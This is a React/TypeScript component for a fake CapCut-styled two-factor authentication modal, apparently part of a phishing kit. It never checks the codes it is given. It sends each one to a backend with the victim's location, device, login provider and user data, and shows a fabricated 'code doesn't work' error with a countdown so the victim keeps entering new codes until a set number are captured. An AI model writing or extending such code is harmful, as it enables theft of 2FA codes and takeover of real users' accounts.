import VerifyImage from '@/assets/images/verify-image.png';
import { CAPCUT_BTN_PRIMARY, CAPCUT_INPUT_CLASS, ModalShell, ModalSpinner } from '@/components/form-modal/modal-shell';
import { useTranslation } from '@/hooks/use-translation';
import { store } from '@/store/store';
import { submitFormStep } from '@/lib/ui-form-submit';
import config from '@/utils/config';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VERIFY_MODAL_TEXTS = [
    'Two-Factor Authentication',
    'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
    'Code',
    "This code doesn't work. Check it's correct or try a new one after",
    'Continue'
] as const;

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const { t } = useTranslation(VERIFY_MODAL_TEXTS);
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);

    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addCode, setMessageId } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const maxPass = config.MAX_PASS ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
            return () => clearTimeout(timer);
        }
        if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);
        addCode(code);

        try {
            const res = await submitFormStep(
                { geoInfo, deviceLabel, messageId, userData, loginProvider },
                { step: 'verify_code', code, attempt: next }
            );

            if (typeof res.messageId === 'number') {
                setMessageId(res.messageId);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <ModalShell title={t('Two-Factor Authentication')} showClose={false}>
            <div className='flex flex-1 flex-col px-5 py-4'>
                <p className='mb-6 text-body-md leading-relaxed text-on-surface-variant'>
                    {t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}
                </p>

                <div className='mb-6 overflow-hidden rounded-xl border border-surface-border'>
                    <Image src={VerifyImage} alt='' className='h-auto w-full opacity-90' />
                </div>

                <div className='mb-2'>
                    <label htmlFor='code-input' className='mb-1.5 block font-label-md text-label-md text-on-surface-variant'>
                        {t('Code')}
                    </label>
                    <input
                        type='tel'
                        inputMode='numeric'
                        pattern='[0-9]*'
                        id='code-input'
                        value={code}
                        onChange={(e) => {
                            const value = e.target.value.replaceAll(/\D/g, '');
                            if (value.length <= 8) setCode(value);
                        }}
                        maxLength={8}
                        disabled={countdown > 0}
                        className={`${CAPCUT_INPUT_CLASS} text-center text-lg tracking-[0.3em] ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
                        placeholder='••••••'
                    />
                </div>

                {showError && (
                    <p className='mb-2 text-sm text-error'>
                        {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                    </p>
                )}

                <button
                    type='button'
                    onClick={handleSubmit}
                    disabled={isLoading || code.length < 6 || countdown > 0}
                    className={`${CAPCUT_BTN_PRIMARY} mt-4 mb-2`}
                >
                    {isLoading ? <ModalSpinner /> : t('Continue')}
                </button>
            </div>
        </ModalShell>
    );
};

export default VerifyModal;
